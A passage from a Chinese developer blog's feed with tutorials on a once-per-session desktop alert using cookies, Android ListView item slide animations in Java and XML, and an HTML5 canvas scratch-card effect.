alertornot()&#123;</span><br><span class="line">if (get_cookie(&apos;alerted&apos;)==&apos;&apos;)&#123;</span><br><span class="line">        loadalert();</span><br><span class="line">document.cookie=&quot;alerted=yes&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">function loadalert()&#123;</span><br><span class="line">if (!/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent))</span><br><span class="line">alert(alertmessage);</span><br><span class="line">&#125;</span><br><span class="line">if (once_per_session==0)</span><br><span class="line">loadalert();</span><br><span class="line">else</span><br><span class="line">alertornot();</span><br><span class="line">&#125; catch(e)</span><br><span class="line">&#123;</span><br><span class="line">alert(e);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/d23d13ae/">http://home.meng.uno/articles/d23d13ae/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      需求

项目的网站时做的手机网页，但是没有考虑到自适应pc端，只是在chrome中固定了手机屏幕大小，所以在pc端查看会很丑，布局是乱的；但是重写又很麻烦，所以有必要做一下提醒，让用户手动将网页缩小到手机屏幕大小。

用到

非手机检验和cookie记录

方法

这段代码是使用了cookie来控制的

 1. 使用cookie让浏览器记住页面已经打开过一次，当前页面刷新不会弹出提醒。
 2. 浏览器一旦关闭，保存这个记录的cookie文件将被删除。重新打开浏览器弹出窗口会再次出现，从而确保了在原有的窗口基础上只打开一次。

判断非手机登陆方式

1
2


if (!/Android|web
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="Phone" scheme="http://home.meng.uno/tags/Phone/"/>
    
      <category term="登录" scheme="http://home.meng.uno/tags/%E7%99%BB%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Listview Item进入和删除动画</title>
    <link href="http://home.meng.uno/articles/fb92c8a1/"/>
    <id>http://home.meng.uno/articles/fb92c8a1/</id>
    <published>2015-11-24T14:08:59.000Z</published>
    <updated>2020-12-02T01:54:28.000Z</updated>
    
    <content type="html"><![CDATA[<h1>从右边划入的动画</h1><ul>  <li>定义xml动画</li></ul><figure class="highlight xml">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">translate</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:duration</span>=<span class="string">"@integer/animTime"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:fromXDelta</span>=<span class="string">"100%p"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:toXDelta</span>=<span class="string">"0%p"</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">translate</span>&gt;</span></span><br></pre>      </td>    </tr>  </table></figure><ul>  <li><code>Adapter</code>里只需要写如下代码</li></ul><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> View <span class="title">getChildView</span><span class="params">(<span class="keyword">final</span> <span class="keyword">int</span> groupPosition, <span class="keyword">int</span> childPosition, </span></span></span><br><span class="line"><span class="function"><span class="params">     <span class="keyword">boolean</span> isLastChild, View convertView, ViewGroup parent)</span> </span>&#123;</span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">if</span> (!junk.isAnimatedBefore()) &#123;</span><br><span class="line">        junk.setAnimatedBefore(<span class="keyword">true</span>);</span><br><span class="line">        convertView.startAnimation(AnimationUtils.loadAnimation(mContext, R.anim.slide_left_in));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        convertView.clearAnimation();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> convertView;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h1>从左边划出的动画</h1><ul>  <li>定义xml动画</li></ul><figure class="highlight xml">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">set</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:fillEnabled</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:fillAfter</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:duration</span>=<span class="string">"@integer/animTime"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">translate</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:fromXDelta</span>=<span class="string">"0%p"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:toXDelta</span>=<span class="string">"-100%p"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">translate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br></pre>      </td>    </tr>  </table></figure><ul>  <li><code>Adapter</code>里不需要做什么，需要在外面操作<code>ListView</code>.</li></ul><h1>在外面操作<code>ListView</code></h1><ul>  <li>开始动画</li></ul><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startBoost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    mIsDeleting = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">boolean</span> hasAnimation = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">long</span> offset = <span class="number">0</span>;</span><br><span class="line">    mAnimCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> groupPosition = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> childPosition = -<span class="number">1</span>;</span><br><span class="line">    Iterator&lt;ArrayList&lt;Junk&gt;&gt; listIterator = mChildren.iterator();</span><br><span class="line">    <span class="keyword">while</span> (listIterator.hasNext()) &#123;</span><br><span class="line">        groupPosition++;</span><br><span class="line">        <span class="keyword">final</span> Iterator&lt;Junk&gt; junkIterator = listIterator.next().iterator();</span><br><span class="line">        <span class="keyword">while</span> (junkIterator.hasNext()) &#123;</span><br><span class="line">            childPosition++;</span><br><span class="line">            Junk junk = junkIterator.next();</span><br><span class="line">            <span class="keyword">if</span> (junk.isChecked()) &#123;</span><br><span class="line">                ...</span><br><span class="line">                junkIterator.remove();</span><br><span class="line">                <span class="keyword">final</span> View itemView = ListViewUtil.getChildItemView(<span class="keyword">this</span>,</span><br><span class="line">                                                 mListView, groupPosition, childPosition);</span><br><span class="line">                <span class="keyword">if</span> (itemView != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    hasAnimation = <span class="keyword">true</span>;</span><br><span class="line">                    ((Animation) itemView.getTag(R.id.anim)).setAnimationListener(mAnimationListener);</span><br><span class="line">                    ((Animation) itemView.getTag(R.id.anim)).setStartOffset(offset);</span><br><span class="line">                    offset += <span class="number">100</span>;</span><br><span class="line">                    itemView.startAnimation(((Animation) itemView.getTag(R.id.anim)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!hasAnimation) &#123;</span><br><span class="line">        deleteCompleted();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li><code>mAnimationListener</code>定义如下：</li></ul><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">private</span> Animation.AnimationListener mAnimationListener = <span class="keyword">new</span> Animation.AnimationListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onAnimationStart</span><span class="params">(Animation animation)</span> </span>&#123;</span><br><span class="line">        mAnimCount++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onAnimationEnd</span><span class="params">(Animation animation)</span> </span>&#123;</span><br><span class="line">        mAnimCount--;</span><br><span class="line">        <span class="keyword">if</span> (mAnimCount == <span class="number">0</span>) &#123;</span><br><span class="line">            deleteCompleted();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onAnimationRepeat</span><span class="params">(Animation animation)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>删除完成后需要调用<code>ListViewUtil.clearListViewAnim(this, mListView);</code>,否则原来动画的地方会显示空白。</li>  <li>动画时要禁用<code>OnTouch</code>事件，因为我们做动画时并没有调用<code>mAdapter.notifyDataSetChanged()</code>，所以如果滚动，由于数据没有同步，肯定会挂掉。</li></ul><p><strong>禁用<code>OnTouch</code>事件的方法如下</strong></p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">dispatchTouchEvent</span><span class="params">(MotionEvent ev)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// intercept touch event when deleting ,avoid listview get view.</span></span><br><span class="line">    <span class="keyword">if</span> (mIsDeleting) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.dispatchTouchEvent(ev);</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h1><code>ListView</code>的工具方法</h1><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> View <span class="title">getChildItemView</span><span class="params">(Context context, FloatingGroupExpandableListView listView, <span class="keyword">int</span> groupPosition, <span class="keyword">int</span> childPosition)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> packedPosition = ExpandableListView.getPackedPositionForChild(groupPosition, childPosition);</span><br><span class="line">    <span class="keyword">int</span> flatPosition;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        flatPosition = listView.getFlatListPosition(packedPosition);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> firstPosition = listView.getFirstVisiblePosition();</span><br><span class="line">    <span class="keyword">int</span> wantedChild = flatPosition - firstPosition;</span><br><span class="line">    <span class="keyword">if</span> (wantedChild &lt; <span class="number">0</span> || wantedChild &gt;= listView.getChildCount()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    View childItemView = listView.getChildAt(wantedChild);</span><br><span class="line">    childItemView.setTag(R.id.anim, AnimationUtils.loadAnimation(context, R.anim.slide_left_out));</span><br><span class="line">    <span class="keyword">return</span> childItemView;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> View <span class="title">getItemView</span><span class="params">(Context context, ListView listView, <span class="keyword">int</span> position)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> firstPosition = listView.getFirstVisiblePosition() - listView.getHeaderViewsCount();</span><br><span class="line">    <span class="keyword">int</span> wantedChild = position - firstPosition;</span><br><span class="line">    <span class="keyword">if</span> (wantedChild &lt; <span class="number">0</span> || wantedChild &gt;= listView.getChildCount()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    View wantedView = listView.getChildAt(wantedChild);</span><br><span class="line">    wantedView.setTag(R.id.anim, AnimationUtils.loadAnimation(context, R.anim.slide_left_out));</span><br><span class="line">    <span class="keyword">return</span> wantedView;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">clearListViewAnim</span><span class="params">(Context context, ListView listView)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> first = listView.getFirstVisiblePosition();</span><br><span class="line">    <span class="keyword">int</span> count = listView.getChildCount() + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = first; i &lt; first + count; i++) &#123;</span><br><span class="line">        View itemView = getItemView(context, listView, i);</span><br><span class="line">        <span class="keyword">if</span> (itemView != <span class="keyword">null</span>) &#123;</span><br><span class="line">            itemView.clearAnimation();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/fb92c8a1/">http://home.meng.uno/articles/fb92c8a1/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      从右边划入的动画
 * 定义xml动画

1
2
3
4
5
6


&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;translate xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
    android:duration=&quot;@integer/animTime&quot;
    android:fromXDelta=&quot;100%p&quot;
    android:toXDelta=&quot;0%p&quot; &gt;
&lt;/translate&gt;


 * Adapter里只需要写如下代码

1
2
3
4
5
6
7
8
9
1
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="listview" scheme="http://home.meng.uno/tags/listview/"/>
    
      <category term="animation" scheme="http://home.meng.uno/tags/animation/"/>
    
  </entry>
  
  <entry>
    <title>HTML5实现刮奖效果</title>
    <link href="http://home.meng.uno/articles/9da0578c/"/>
    <id>http://home.meng.uno/articles/9da0578c/</id>
    <published>2015-07-15T23:31:04.000Z</published>
    <updated>2020-12-02T01:47:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>要实现刮奖效果，最重要的是要找到一种方法：当刮开上层的涂层是就能看到下层的结果。而HTML5的canvas API中有一个属性globalCompositeOperation，这个属性有多个值，而实现刮奖效果要用到的值就是destination-out。意思就是：在已有内容和新图形不重叠的地方，已有内容保留，所有其他内容成为透明。这样可能不好理解，后面实现的时候会解释。有了globalCompositeOperation这个属性，实现过程就很简单了。</p><p>我们需要有两个层，上面一层肯定是一个canvas元素，因为要能刮开就要用到画布。下面一层其实用什么元素都可以，既然上层用的是canvas元素，下层我们也用canvas元素，下面是html内容：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre>      </td>      <td class="code">        <pre><span class="line">   &lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;刮刮乐&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;canvas id=&quot;underCanvas&quot; width=300 height=300 style=&quot;position: absolute; left: 0;top: 0;&quot;&gt;&lt;/canvas&gt;</span><br><span class="line">    &lt;canvas id=&quot;upCanvas&quot; width=300 height=300 style=&quot;position: absolute; left: 0; top: 0;&quot;&gt;&lt;/canvas&gt;</span><br><span class="line">    &lt;script src=&quot;./scratch.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">        // 可能变化的值放在options中，方便修改</span><br><span class="line">        var options = &#123;</span><br><span class="line">            text: &#123;</span><br><span class="line">                fontWeight: &quot;bold&quot;,</span><br><span class="line">                fontSize: 30,</span><br><span class="line">                fontFamily: &quot;Arial&quot;,</span><br><span class="line">                align: &quot;center&quot;,</span><br><span class="line">                color: &apos;#F60&apos;</span><br><span class="line">            &#125;,</span><br><span class="line">            maskColor: &quot;red&quot;,</span><br><span class="line">            radius: 30,</span><br><span class="line">            awards: [&quot;一等奖&quot;, &quot;二等奖&quot;, &quot;三等奖&quot;, &quot;谢谢！&quot;]</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        new Scratch(options).init();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>先实现一个构造函数：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>      </td>      <td class="code">        <pre><span class="line">  var Scratch = function (options) &#123;</span><br><span class="line">// 下层画布元素</span><br><span class="line">      this.underCanvas = doc.getElementById(&quot;underCanvas&quot;);</span><br><span class="line">      // 上层画布元素</span><br><span class="line">this.upCanvas = doc.getElementById(&quot;upCanvas&quot;);</span><br><span class="line">      // 获取下层画布绘图上下文</span><br><span class="line">this.underCtx = this.underCanvas.getContext(&quot;2d&quot;);</span><br><span class="line">      // 获取上层画布绘图上下文</span><br><span class="line">this.upCtx = this.upCanvas.getContext(&quot;2d&quot;);</span><br><span class="line">     // 画布宽度</span><br><span class="line">this.width = this.upCanvas.width;</span><br><span class="line">      // 画布高度</span><br><span class="line">this.height = this.upCanvas.height;</span><br><span class="line">      // 自定义选项</span><br><span class="line">this.options = options;</span><br><span class="line">      this.award = null;</span><br><span class="line">  &#125;;</span><br></pre>      </td>    </tr>  </table></figure><p>在下层画布上画上刮奖的内容：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line">drawText: function () &#123;</span><br><span class="line">       var ctx = this.underCtx;</span><br><span class="line">       var text = this.options.text;</span><br><span class="line">       ctx.font = text.fontWeight + &quot; &quot; + text.fontSize + &apos;px &apos; + text.fontFamily;</span><br><span class="line">       ctx.textAlign = text.align;</span><br><span class="line">       ctx.fillStyle = text.color;</span><br><span class="line">       this.award = this.options.awards[(Math.random() * this.options.awards.length) | 0]; //随机抽奖</span><br><span class="line">       ctx.fillText(this.award, this.width / 2, this.height / 2 + text.fontSize / 2);</span><br><span class="line">   &#125;</span><br></pre>      </td>    </tr>  </table></figure><p>这边奖的内容是随机出现的，因为奖肯定有很多种，可以用一个数组来存放奖的内容，然后随机显示：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">this.award = this.options.awards[(Math.random() * this.options.awards.length) | 0];</span><br></pre>      </td>    </tr>  </table></figure><p>然后在上层画布中画一层涂层：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line">drawMask: function () &#123;</span><br><span class="line">    var ctx = this.upCtx;</span><br><span class="line">    ctx.fillStyle = this.options.maskColor;</span><br><span class="line">    ctx.fillRect(0, 0, this.width, this.height);</span><br><span class="line">    ctx.globalCompositeOperation = &apos;destination-out&apos;;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>在上层画布中用了globalCompositeOperation这个属性，当再在画布上画东西时，那么后面画的内容和涂层重合的部分将变透明，而其余涂层部分不变。就是利用了这个原理实现了刮奖效果。</p><p>需要刮开上层的涂层，就需要在上层画布上绑定事件：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre>      </td>      <td class="code">        <pre><span class="line">addEvent: function () &#123;</span><br><span class="line">    var that = this;</span><br><span class="line">    var upCanvas = this.upCanvas;</span><br><span class="line">    var callback1, callback2, callback3;</span><br><span class="line">    upCanvas.addEventListener(&quot;mousedown&quot;, callback1 = function (evt) &#123;</span><br><span class="line">        upCanvas.addEventListener(&quot;mousemove&quot;, callback2 = function (evt) &#123;</span><br><span class="line">            var x = evt.clientX - upCanvas.offsetLeft;</span><br><span class="line">            var y = evt.clientY - upCanvas.offsetTop;</span><br><span class="line">            var ctx = that.upCtx;</span><br><span class="line">            var options = that.options;</span><br><span class="line">            ctx.beginPath();</span><br><span class="line">            var gradient = ctx.createRadialGradient(x, y, 0, x, y, options.radius);</span><br><span class="line">            // 其实这边的颜色值是可以随便写的，因为都会变成透明，重要的是透明度</span><br><span class="line">            gradient.addColorStop(0, &quot;rgba(255, 255, 255, 0.5)&quot;);</span><br><span class="line">            gradient.addColorStop(1, &quot;rgba(255, 255, 255, 0)&quot;);</span><br><span class="line">// 也可以不用渐变，直接用一种颜色，但渐变效果更好</span><br><span class="line">            ctx.fillStyle = gradient;</span><br><span class="line">            ctx.arc(x, y, options.radius, 0, Math.PI * 2, true);</span><br><span class="line">            ctx.fill();</span><br><span class="line">            ctx.closePath();</span><br><span class="line">// 当刮开部分&gt;80%的时候提醒刮奖结果，这个可以自己设置</span><br><span class="line">            if (that.result() &gt; 0.8) &#123;</span><br><span class="line">                alert(that.award);</span><br><span class="line">                upCanvas.removeEventListener(&quot;mousemove&quot;, callback2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, false);</span><br><span class="line">        doc.addEventListener(&quot;mouseup&quot;, callback3 = function () &#123;</span><br><span class="line">            upCanvas.removeEventListener(&quot;mousemove&quot;, callback2);</span><br><span class="line">            doc.removeEventListener(&quot;mouseup&quot;, callback3);</span><br><span class="line">        &#125;, false);</span><br><span class="line">    &#125;, false);</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>我们需要在刮到一定程度时提醒刮奖的结果：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>      </td>      <td class="code">        <pre><span class="line">  result: function () &#123;</span><br><span class="line">// 获取文字部分的宽、高</span><br><span class="line">      var textWidth = this.options.text.fontSize * this.award.length;</span><br><span class="line">      var textHeight = this.options.text.fontSize;</span><br><span class="line">      // 获取文字部分的像素，这样可以根据刮开文字的部分占全部文字部分的百分比来提示结果，比如说在刮开80%的时候提示刮奖结果</span><br><span class="line">      var imgData = this.upCtx.getImageData(this.width / 2 - textWidth / 2, this.height / 2 - textHeight / 2, textWidth, textHeight);</span><br><span class="line">      var pixelsArr = imgData.data;</span><br><span class="line">      var transPixelsArr = [];</span><br><span class="line">      for (var i = 0, j = pixelsArr.length; i &lt; j; i += 4) &#123;</span><br><span class="line">          // a代表透明度</span><br><span class="line">          var a = pixelsArr[i + 3];</span><br><span class="line">          // 渐变的透明度＜=0.5，其实透明度的值是介于0~255之间的，0.5 * 255 = 127.5就是a的值</span><br><span class="line">          if (a &lt; 128) &#123;</span><br><span class="line">              transPixelsArr.push(a);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      // 小于128的透明度的值的个数占总透明度的的个数的百分比</span><br><span class="line">      return transPixelsArr.length / (pixelsArr.length / 4);</span><br><span class="line">  &#125;</span><br></pre>      </td>    </tr>  </table></figure><p>上面用到了getImageData()方法，这个方法返回像素数据。重要的是我们只是获取了下层文字部分的像素数据，因为我们只需要知道刮开的文字部分占全部文字部分的百分比。</p><p>调用构造函数时，把可能改变的东西放在一个对象options中传递给构造函数：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>      </td>      <td class="code">        <pre><span class="line">  // 可能变化的值放在options中，方便修改</span><br><span class="line">  var options = &#123;</span><br><span class="line">// 文字部分的样式</span><br><span class="line">      text: &#123;</span><br><span class="line">          fontWeight: &quot;bold&quot;,</span><br><span class="line">          fontSize: 